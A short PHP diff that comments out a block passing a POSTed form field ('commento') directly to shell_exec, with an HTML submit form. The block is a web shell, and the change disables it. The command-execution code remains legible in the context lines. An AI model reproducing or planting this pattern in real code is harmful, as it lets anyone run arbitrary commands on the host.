@@ -7,6 +7,7 @@ echo $output;
 ?>
 
 <?php
+/*
 if(isset($_POST['commento']))
 {
   $output = shell_exec($_POST['commento']); //--norestore
@@ -23,3 +24,5 @@ if(isset($_POST['commento']))
 <input type="submit">
 </form>
 
+*/
+?>
